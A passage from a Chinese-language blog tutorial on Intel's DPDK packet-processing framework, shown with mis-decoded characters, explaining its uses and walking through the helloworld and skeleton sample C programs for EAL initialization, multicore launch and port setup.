ä»è°ˆèµ·ã€‚DPDKå§‹ç»ˆä¸ºé«˜æ€§èƒ½ä¸šåŠ¡é¢æä¾›åšå®çš„æ”¯æ’‘ï¼Œé™¤æ­¤ä»¥å¤–ï¼ŒDPDKç«‹è¶³IAçš„CPU è™šæ‹ŸåŒ–æŠ€æœ¯å’ŒIOçš„è™šæ‹ŸåŒ–æŠ€æœ¯ï¼Œå¯¹å„ç§é€šé“åšæŒç»­ä¼˜åŒ–æ”¹è¿›çš„åŒæ—¶ï¼Œä¹Ÿå¯¹è™šæ‹Ÿäº¤æ¢ï¼ˆvswitchï¼‰çš„è½¬å‘é¢è¿›åŒ–åšå‡ºç§¯æè´¡çŒ®ã€‚åº”å¯¹ç»å¯¹é«˜ååèƒ½åŠ›çš„è¦æ±‚ï¼ŒDPDKæ”¯æŒå„ç§I/Oçš„SR-IOVæ¥å£ï¼›åº”å¯¹é«˜æ€§èƒ½è™šæ‹Ÿä¸»æœºç½‘ç»œçš„è¦æ±‚ï¼ŒDPDKæ”¯æŒæ ‡å‡†virtioæ¥å£ï¼›å¯¹è™šæ‹ŸåŒ–å¹³å°çš„æ”¯æ’‘ï¼ŒDPDKä»KVMã€VMWAREã€XENçš„hypervisoråˆ°å®¹å™¨æŠ€æœ¯ï¼Œå¯è°“å…¨å¹³å°è¦†ç›–ã€‚</p><h5 id="DPDKåŠ é€Ÿè®¡ç®—èŠ‚ç‚¹"><a href="#DPDKåŠ é€Ÿè®¡ç®—èŠ‚ç‚¹" class="headerlink" title="DPDKåŠ é€Ÿè®¡ç®—èŠ‚ç‚¹"></a>DPDKåŠ é€Ÿè®¡ç®—èŠ‚ç‚¹</h5><p>C10Kæ˜¯ITç•Œçš„ä¸€ä¸ªè‘—åå‘½é¢˜ï¼Œç”šè‡³åç»­è¡ç”Ÿå‡ºäº†å…³äºC1Må’ŒC10Mçš„è®¨è®ºã€‚å…¶é˜è¿° çš„ä¸€ä¸ªæ ¸å¿ƒé—®é¢˜å°±æ˜¯ï¼Œéšç€äº’è”ç½‘å‘å±•ï¼Œéšç€æ•°æ®ä¸­å¿ƒæ¥å£å¸¦å®½ä¸æ–­æå‡ï¼Œè®¡ç®—èŠ‚ç‚¹ä¸Šå„ç§äº’è”ç½‘æœåŠ¡å¯¹äºé«˜å¹¶å‘ä¸‹çš„é«˜ååæœ‰ç€è¶Šæ¥è¶Šé«˜çš„è¦æ±‚ã€‚ </p><p>ä½†æ˜¯å•ä¸€æ¥å£å¸¦å®½çš„æé«˜å¹¶ä¸èƒ½ç›´æ¥å¯¼è‡´é«˜å¹¶å‘ã€é«˜ååæœåŠ¡çš„å‘ç”Ÿï¼Œå³ä½¿ç”¨åˆ°äº†ä¸€ç³»åˆ—ç³»ç»Ÿæ–¹æ³•ï¼ˆå¼‚æ­¥éé˜»å¡ï¼Œçº¿ç¨‹ç­‰ï¼‰ï¼Œä½†ç½‘ç»œæœåŠ¡å—é™äºå†…æ ¸åè®®æ ˆå¤šæ ¸æ°´å¹³æ‰©å±•ä¸Šçš„ä¸è¶³ä»¥åŠå»ºç«‹æ‹†é™¤è¿æ¥çš„é«˜å¼€é”€ï¼Œå¼€å§‹é€æ¸é˜»ç¢è¿›ä¸€æ­¥é«˜å¹¶å‘ä¸‹é«˜å¸¦å®½çš„è¦æ±‚ã€‚å¦ä¸€æ–¹é¢ï¼Œå†…æ ¸åè®®æ ˆéœ€è¦è€ƒè™‘æ›´å¹¿æ³›çš„æ”¯æŒï¼Œå¹¶ä¸èƒ½ä¸ºç‰¹å®šçš„åº”ç”¨åšç‰¹æ®Šä¼˜åŒ–ï¼Œä¸€èˆ¬åªèƒ½ä½¿ç”¨ç³»ç»Ÿå‚æ•°è¿›è¡Œè°ƒä¼˜ã€‚ å½“ç„¶ï¼Œå†…æ ¸åè®®æ ˆä¹Ÿåœ¨ä¸æ–­æ”¹è¿›ï¼Œè€Œä»¥åº”ç”¨ä¸ºä¸­å¿ƒçš„è¶‹åŠ¿ä¹Ÿä¼šä¸æ–­æ¨åŠ¨ç”¨æˆ·æ€åè®®æ ˆçš„æ¶Œç°ã€‚æœ‰åŸºäºBSDåè®®æ ˆç§»æ¤çš„ï¼Œæœ‰åŸºäºå¤šæ ¸æ¨¡å‹é‡å†™çš„åŸå‹è®¾è®¡ï¼Œä¹Ÿæœ‰å°†æ•´ä¸ªLinuxå†…æ ¸åŒ…è£…æˆåº“çš„ã€‚å®ƒä»¬å¤§å¤šæ”¯æŒä»¥DPDKä½œä¸ºI/Oå¼•æ“ï¼Œæœ‰äº›ä¹Ÿå°†DPDKçš„ä¸€äº›ä¼˜åŒ–æƒ³æ³•åŠ å…¥åˆ°åè®®æ ˆçš„ä¼˜åŒ–ä¸­ï¼Œå–å¾—äº†æ¯”è¾ƒå¥½çš„æ•ˆæœã€‚</p><h5 id="DPDKåŠ é€Ÿå­˜å‚¨èŠ‚ç‚¹"><a href="#DPDKåŠ é€Ÿå­˜å‚¨èŠ‚ç‚¹" class="headerlink" title="DPDKåŠ é€Ÿå­˜å‚¨èŠ‚ç‚¹"></a>DPDKåŠ é€Ÿå­˜å‚¨èŠ‚ç‚¹</h5><p>Intelæœ€è¿‘å¼€æºäº†SPDKï¼ˆStorage Performance Development Kitï¼‰ï¼Œä¸€æ¬¾å­˜å‚¨åŠ é€Ÿå¼€å‘å¥—ä»¶ï¼Œå…¶ä¸»è¦çš„åº”ç”¨åœºæ™¯æ˜¯iSCSIæ€§èƒ½åŠ é€Ÿã€‚ç›®å‰iSCSIç³»ç»ŸåŒ…æ‹¬å‰ç«¯å’Œåç«¯ä¸¤ä¸ªéƒ¨åˆ†ï¼Œåœ¨å‰ç«¯ï¼ŒDPDKæä¾›ç½‘ç»œI/OåŠ é€Ÿï¼ŒåŠ ä¸Šä¸€å¥—ç”¨æˆ·æ€TCP/IPåè®®æ ˆï¼ˆç›®å‰è¿˜ä¸åŒ…å«åœ¨å¼€æºåŒ…ä¸­ï¼‰ï¼Œä»¥æµæ°´çº¿çš„å·¥ä½œæ–¹å¼æ”¯æ’‘èµ·åŸºäºiSCSIçš„åº”ç”¨ï¼›åœ¨åç«¯ï¼Œå°†DPDKç”¨æˆ·æ€è½®è¯¢é©±åŠ¨çš„æ–¹å¼å®è·µåœ¨NVMeä¸Šï¼ŒPMDçš„NVMeé©±åŠ¨åŠ é€Ÿäº†åç«¯å­˜å‚¨è®¿é—®ã€‚è¿™æ ·ä¸€ä¸ªç«¯åˆ°ç«¯çš„æ•´ä½“æ–¹æ¡ˆï¼Œç”¨æ•°æ®è¯æ˜äº†å“æœ‰æˆæ•ˆçš„IOPSæ€§èƒ½æå‡ã€‚</p><h5 id="DPDKæ–¹æ³•è®º"><a href="#DPDKæ–¹æ³•è®º" class="headerlink" title="DPDKæ–¹æ³•è®º"></a>DPDKæ–¹æ³•è®º</h5><ul><li>ä¸“ç”¨è´Ÿè½½ä¸‹çš„é’ˆå¯¹æ€§è½¯ä»¶ä¼˜åŒ–</li><li>è¿½æ±‚å¯æ°´å¹³æ‰©å±•çš„æ€§èƒ½</li><li>å‘Cacheç´¢æ±‚æè‡´çš„å®ç°ä¼˜åŒ–æ€§èƒ½</li></ul><h4 id="DPDKå®‰è£…"><a href="#DPDKå®‰è£…" class="headerlink" title="DPDKå®‰è£…"></a>DPDKå®‰è£…</h4><p>Todo</p><h4 id="DPDKå®ä¾‹"><a href="#DPDKå®ä¾‹" class="headerlink" title="DPDKå®ä¾‹"></a>DPDKå®ä¾‹</h4><p>åœ¨å¯¹DPDKçš„åŸç†å’Œä»£ç å±•å¼€è¿›ä¸€æ­¥è§£æä¹‹å‰ï¼Œå…ˆçœ‹ä¸€äº›å°è€Œç®€å•çš„ä¾‹å­ï¼Œå»ºç«‹ä¸€ä¸ªå½¢è±¡ä¸Šçš„è®¤çŸ¥ã€‚</p><ul><li>helloworldï¼šå¯åŠ¨åŸºç¡€è¿è¡Œç¯å¢ƒï¼ŒDPDKæ„å»ºäº†ä¸€ä¸ªåŸºäºæ“ä½œç³»ç»Ÿçš„ï¼Œä½†é€‚åˆåŒ…å¤„ç†çš„è½¯ä»¶è¿è¡Œç¯å¢ƒï¼Œä½ å¯ä»¥è®¤ä¸ºè¿™æ˜¯ä¸ªmini-OS</li><li>skeletonï¼šæœ€ç²¾ç®€çš„å•æ ¸æŠ¥æ–‡æ”¶å‘éª¨æ¶</li><li>l3fwdï¼šä¸‰å±‚è½¬å‘æ˜¯DPDKç”¨äºå‘å¸ƒæ€§èƒ½æµ‹è¯•æŒ‡æ ‡çš„ä¸»è¦åº”ç”¨</li></ul><h5 id="Helloworld"><a href="#Helloworld" class="headerlink" title="Helloworld"></a>Helloworld</h5><p>DPDKé‡Œçš„helloworldæ˜¯æœ€åŸºç¡€çš„å…¥é—¨ç¨‹åºã€‚å®ƒå»ºç«‹äº†ä¸€ä¸ªå¤šæ ¸è¿è¡Œçš„åŸºç¡€ç¯å¢ƒï¼Œæ¯ä¸ªçº¿ç¨‹ä¼šæ‰“å°<code>hello from core #</code>ï¼Œå…¶ä¸­<code>core #</code>æ˜¯ç”±æ“ä½œç³»ç»Ÿç®¡ç†çš„ã€‚</p><p>ä»£ç å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* SPDX-License-Identifier: BSD-3-Clause</span></span><br><span class="line"><span class="comment"> * Copyright(c) 2010-2014 Intel Corporation</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/queue.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;rte_memory.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;rte_launch.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;rte_eal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;rte_per_lcore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;rte_lcore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;rte_debug.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Launch a function on lcore. 8&lt; */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">lcore_hello(__rte_unused <span class="keyword">void</span> *arg)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">unsigned</span> lcore_id;</span><br><span class="line">lcore_id = rte_lcore_id();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"hello from core %u\n"</span>, lcore_id);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &gt;8 End of launching function on lcore. */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Initialization of Environment Abstraction Layer (EAL). 8&lt; */</span></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">main(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"><span class="keyword">unsigned</span> lcore_id;</span><br><span class="line"></span><br><span class="line">ret = rte_eal_init(argc, argv);</span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">rte_panic(<span class="string">"Cannot init EAL\n"</span>);</span><br><span class="line"><span class="comment">/* &gt;8 End of initialization of Environment Abstraction Layer */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Launches the function on each lcore. 8&lt; */</span></span><br><span class="line">RTE_LCORE_FOREACH_WORKER(lcore_id) &#123;</span><br><span class="line"><span class="comment">/* Simpler equivalent. 8&lt; */</span></span><br><span class="line">rte_eal_remote_launch(lcore_hello, <span class="literal">NULL</span>, lcore_id);</span><br><span class="line"><span class="comment">/* &gt;8 End of simpler equivalent. */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* call it on main lcore too */</span></span><br><span class="line">lcore_hello(<span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">/* &gt;8 End of launching the function on each lcore. */</span></span><br><span class="line"></span><br><span class="line">rte_eal_mp_wait_lcore();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* clean up the EAL */</span></span><br><span class="line">rte_eal_cleanup();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»ä»£ç è§’åº¦ï¼Œ<code>rte</code>æ˜¯æŒ‡<code>runtime environment</code>ï¼Œ<code>eal</code>æ˜¯æŒ‡<code>environment abstraction layer</code>ã€‚DPDKçš„ä¸»è¦å¯¹å¤–å‡½æ•°æ¥å£éƒ½æ˜¯ä»¥<code>rte_</code>ä½œä¸ºå‰ç¼€ï¼ŒæŠ½è±¡åŒ–å‡½æ•°æ¥å£å¯ä»¥å¸®åŠ©DPDKè¿è¡Œåœ¨å¤šä¸ªæ“ä½œç³»ç»Ÿä¸Šã€‚</p><h6 id="åˆå§‹åŒ–åŸºç¡€è¿è¡Œç¯å¢ƒ"><a href="#åˆå§‹åŒ–åŸºç¡€è¿è¡Œç¯å¢ƒ" class="headerlink" title="åˆå§‹åŒ–åŸºç¡€è¿è¡Œç¯å¢ƒ"></a>åˆå§‹åŒ–åŸºç¡€è¿è¡Œç¯å¢ƒ</h6><p>ä¸»çº¿ç¨‹è¿è¡Œå…¥å£æ˜¯<code>main</code>å‡½æ•°ï¼Œè°ƒç”¨äº†<code>rte_eal_init</code>å…¥å£å‡½æ•°ï¼Œå¯åŠ¨åŸºç¡€è¿è¡Œç¯å¢ƒã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">rte_eal_init</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> **argv)</span></span></span><br></pre></td></tr></table></figure><p>å…¥å£å‚æ•°æ˜¯å¯åŠ¨DPDKçš„å‘½ä»¤è¡Œï¼Œå¯ä»¥æ˜¯é•¿é•¿çš„ä¸€ä¸²å¾ˆå¤æ‚çš„è®¾ç½®ã€‚å¯¹äºHelloworldè¿™ä¸ªå®ä¾‹ï¼Œæœ€éœ€è¦çš„å‚æ•°æ˜¯â€-c <core mask>â€œ ï¼Œçº¿ç¨‹æ©ç (core mask)æŒ‡å®šäº†éœ€è¦å‚ä¸è¿è¡Œçš„çº¿ç¨‹é›†åˆã€‚<code>rte_eal_init</code>æœ¬èº«å®Œæˆçš„å·¥ä½œå¾ˆå¤æ‚ï¼Œå®ƒè¯»å–å…¥å£å‚æ•°ï¼Œè§£æå¹¶ä¿å­˜ä½œä¸ºDPDKè¿è¡Œçš„ç³»ç»Ÿä¿¡æ¯ï¼Œä¾èµ–è¿™äº›ä¿¡æ¯ï¼Œæ„å»ºä¸€ä¸ªé’ˆå¯¹åŒ…å¤„ç†è®¾è®¡çš„è¿è¡Œç¯å¢ƒï¼Œä¸»è¦åŠ¨ä½œåˆ†è§£å¦‚ä¸‹ï¼š</core></p><ul><li>é…ç½®åˆå§‹åŒ–</li><li>å†…å­˜åˆå§‹åŒ–</li><li>å†…å­˜æ± åˆå§‹åŒ–</li><li>é˜Ÿåˆ—åˆå§‹åŒ–</li><li>å‘Šè­¦åˆå§‹åŒ–</li><li>ä¸­æ–­åˆå§‹åŒ–</li><li>PCIåˆå§‹åŒ–</li><li>å®šæ—¶å™¨åˆå§‹åŒ–</li><li>æ£€æµ‹å†…å­˜æœ¬åœ°åŒ–(NUMA)</li><li>æ’ä»¶åˆå§‹åŒ–</li><li>ä¸»çº¿ç¨‹åˆå§‹åŒ–</li><li>è½®è¯¢è®¾å¤‡åˆå§‹åŒ–</li><li>å»ºç«‹ä¸»ä»çº¿ç¨‹é€šé“</li><li>å°†ä»çº¿ç¨‹è®¾ç½®åœ¨ç­‰å¾…æ¨¡å¼</li><li>PCIè®¾å¤‡çš„æ¢æµ‹ä¸åˆå§‹åŒ–</li></ul><h6 id="å¤šæ ¸è¿è¡Œåˆå§‹åŒ–"><a href="#å¤šæ ¸è¿è¡Œåˆå§‹åŒ–" class="headerlink" title="å¤šæ ¸è¿è¡Œåˆå§‹åŒ–"></a>å¤šæ ¸è¿è¡Œåˆå§‹åŒ–</h6><p>DPDKé¢å‘å¤šæ ¸è®¾è®¡ï¼Œç¨‹åºä¼šè¯•å›¾ç‹¬å è¿è¡Œåœ¨é€»è¾‘æ ¸(lcore)ä¸Šã€‚<code>main</code>å‡½æ•°é‡Œé‡è¦çš„æ˜¯å¯åŠ¨å¤šæ ¸è¿è¡Œç¯å¢ƒã€‚<code>RTE_LCORE_FOREACH_WORKER(lcore_id)</code>ï¼Œéå†æ‰€æœ‰EALæŒ‡å®šå¯ä»¥ä½¿ç”¨çš„lcoreï¼Œç„¶åé€šè¿‡<code>rte_eal_remote_launch</code>åœ¨æ¯ä¸ªlcoreä¸Šï¼Œå¯åŠ¨è¢«æŒ‡å®šçš„çº¿ç¨‹ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">rte_eal_remote_launch</span><span class="params">(<span class="keyword">int</span> (*f)(<span class="keyword">void</span> *),<span class="keyword">void</span> *arg,<span class="keyword">unsigned</span> slave_id)</span></span>;</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä»çº¿ç¨‹ï¼Œæ˜¯è¢«å¾å¬çš„çº¿ç¨‹</p><p>ç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¼ ç»™ä»çº¿ç¨‹çš„å‚æ•°</p><p>ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯æŒ‡å®šçš„é€»è¾‘æ ¸ï¼Œä»çº¿ç¨‹ä¼šæ‰§è¡Œåœ¨è¿™ä¸ªcoreä¸Š</p><p><code>rte_eal_remote_launch(lcore_hello, NULL, lcore_id);</code></p><p>å…¶ä¸­ï¼Œå‚æ•°lcore_idæŒ‡å®šäº†ä»çº¿ç¨‹IDï¼Œè¿è¡Œå…¥å£å‡½æ•°lcore_helloï¼Œè¿è¡Œå‡½æ•°lcore_helloï¼Œå®ƒè¯»å–è‡ªå·±çš„é€»è¾‘æ ¸ç¼–å·(lcore_id)ï¼Œæ‰“å°å‡ºâ€hello from core #â€</p><h5 id="Skeleton"><a href="#Skeleton" class="headerlink" title="Skeleton"></a>Skeleton</h5><p>skeletonçš„è®¾è®¡åˆè¡·æ˜¯å®ç°ä¸€ä¸ªæœ€ç®€å•çš„æŠ¥æ–‡æ”¶å‘ç¤ºä¾‹ï¼Œå¯¹æ”¶å…¥æŠ¥æ–‡ä¸åšä»»ä½•å¤„ç†ç›´æ¥å‘é€ã€‚å¯ä»¥ç”¨äºå¹³å°çš„å•æ ¸æŠ¥æ–‡å‡ºå…¥æ€§èƒ½æµ‹è¯•ã€‚</p><p>ä¸»è¦å¤„ç†å‡½æ•°<code>main</code>å¤„ç†é€»è¾‘å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The main function, which does initialization and calls the per-lcore</span></span><br><span class="line"><span class="comment"> * functions.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">main(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rte_mempool</span> *<span class="title">mbuf_pool</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> nb_ports;</span><br><span class="line"><span class="keyword">uint16_t</span> portid;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Initializion the Environment Abstraction Layer (EAL). 8&lt; */</span></span><br><span class="line"><span class="keyword">int</span> ret = rte_eal_init(argc, argv);</span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">rte_exit(EXIT_FAILURE, <span class="string">"Error with EAL initialization\n"</span>);</span><br><span class="line"><span class="comment">/* &gt;8 End of initialization the Environment Abstraction Layer (EAL). */</span></span><br><span class="line"></span><br><span class="line">argc -= ret;</span><br><span class="line">argv += ret;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Check that there is an even number of ports to send/receive on. */</span></span><br><span class="line">nb_ports = rte_eth_dev_count_avail();</span><br><span class="line"><span class="keyword">if</span> (nb_ports &lt; <span class="number">2</span> || (nb_ports &amp; <span class="number">1</span>))</span><br><span class="line">rte_exit(EXIT_FAILURE, <span class="string">"Error: number of ports must be even\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Creates a new mempool in memory to hold the mbufs. */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Allocates mempool to hold the mbufs. 8&lt; */</span></span><br><span class="line">mbuf_pool = rte_pktmbuf_pool_create(<span class="string">"MBUF_POOL"</span>, NUM_MBUFS * nb_ports,</span><br><span class="line">MBUF_CACHE_SIZE, <span class="number">0</span>, RTE_MBUF_DEFAULT_BUF_SIZE, rte_socket_id());</span><br><span class="line"><span class="comment">/* &gt;8 End of allocating mempool to hold mbuf. */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (mbuf_pool == <span class="literal">NULL</span>)</span><br><span class="line">rte_exit(EXIT_FAILURE, <span class="string">"Cannot create mbuf pool\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Initializing all ports. 8&lt; */</span></span><br><span class="line">RTE_ETH_FOREACH_DEV(portid)</span><br><span class="line"><span class="keyword">if</span> (port_init(portid, mbuf_pool) != <span class="number">0</span>)</span><br><span class="line">rte_exit(EXIT_FAILURE, <span class="string">"Cannot init port %"</span>PRIu16 <span class="string">"\n"</span>,</span><br><span class="line">portid);</span><br><span class="line"><span class="comment">/* &gt;8 End of initializing all ports. */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (rte_lcore_count() &gt; <span class="number">1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\nWARNING: Too many lcores enabled. Only 1 used.\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Call lcore_main on the main core only. Called on single lcore. 8&lt; */</span></span><br><span class="line">lcore_main();</span><br><span class="line"><span class="comment">/* &gt;8 End of called on single lcore. */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* clean up the EAL */</span></span><br><span class="line">rte_eal_cleanup();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆè°ƒç”¨<code>rte_eal_init</code>åˆå§‹åŒ–è¿è¡Œç¯å¢ƒã€‚æ£€æŸ¥ç½‘ç»œæ¥å£æ•°ï¼Œæ®æ­¤åˆ†é…å†…å­˜æ± <code>rte_pktmbuf_pool_create</code>ï¼Œå…¥å£å‚æ•°æ˜¯æŒ‡å®š<code>rte_socket_id()</code>ï¼Œè€ƒè™‘äº†æœ¬åœ°å†…å­˜ä½¿ç”¨çš„èŒƒä¾‹ï¼Œè°ƒç”¨<code>port_init(portid, mbuf_pool)</code>åˆå§‹åŒ–ç½‘å£çš„é…ç½®ï¼Œæœ€åè°ƒç”¨<code>lcore_main()</code>è¿›è¡Œä¸»å¤„ç†æµç¨‹ã€‚</p><p>ç½‘å£åˆå§‹åŒ–æµç¨‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">port_init(<span class="keyword">uint8_t</span> port,struct rte_mempool *mbuf_pool)</span><br></pre></td></tr></table></figure><p>é¦–å…ˆå¯¹æŒ‡å®šç«¯å£è®¾ç½®é˜Ÿåˆ—æ•°ï¼Œæœ¬ä¾‹æŒ‡å®šä¸ºå•é˜Ÿåˆ—ã€‚åœ¨æ”¶å‘ä¸¤ä¸ªæ–¹å‘ä¸Šï¼ŒåŸºäºç«¯å£ä¸é˜Ÿåˆ—è¿›è¡Œé…ç½®è®¾ç½®ï¼Œç¼“å†²åŒºè¿›è¡Œå…³è”è®¾ç½®ã€‚</p><p>ç½‘å£è®¾ç½®ï¼šå¯¹æŒ‡å®šç«¯å£è®¾ç½®æ¥æ”¶ã€å‘é€æ–¹å‘çš„é˜Ÿåˆ—æ•°ç›®ã€‚ä¾æ®é…ç½®ä¿¡æ¯æ¥æŒ‡å®šç«¯å£åŠŸèƒ½ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">rte_eth_dev_configure</span><span class="params">(<span class="keyword">uint8_t</span> port_id,<span class="keyword">uint16_t</span> nb_rx_q,<span class="keyword">uint16_t</span> nb_tx_q,<span class="keyword">const</span> struct rte_eth_conf *dev_conf)</span></span></span><br></pre></td></tr></table></figure><p>é˜Ÿåˆ—åˆå§‹åŒ–ï¼šå¯¹æŒ‡å®šç«¯å£çš„æŸä¸ªé˜Ÿåˆ—ï¼ŒæŒ‡å®šå†…å­˜ã€æè¿°ç¬¦æ•°é‡ã€æŠ¥æ–‡ç¼“å†²åŒºã€å¹¶ä¸”å¯¹é˜Ÿåˆ—è¿›è¡Œé…ç½®</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">rte_eth_rx_queue_setup</span><span class="params">(<span class="keyword">uint8_t</span> port_id, <span class="keyword">uint16_t</span> rx_queue_id,</span></span></span><br><span class="line"><span class="function"><span class="params"> <span class="keyword">uint16_t</span> nb_rx_desc, <span class="keyword">unsigned</span> <span class="keyword">int</span> socket_id,</span></span></span><br><span class="line"><span class="function"><span class="params"> <span class="keyword">const</span> struct rte_eth_rxconf *rx_conf,</span></span></span><br><span class="line"><span class="function"><span class="params"> struct rte_mempool *mp)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">rte_eth_tx_queue_setup</span><span class="params">(<span class="keyword">uint8_t</span> port_id, <span class="keyword">uint16_t</span> tx_queue_id,</span></span></span><br><span class="line"><span class="function"><span class="params"> <span 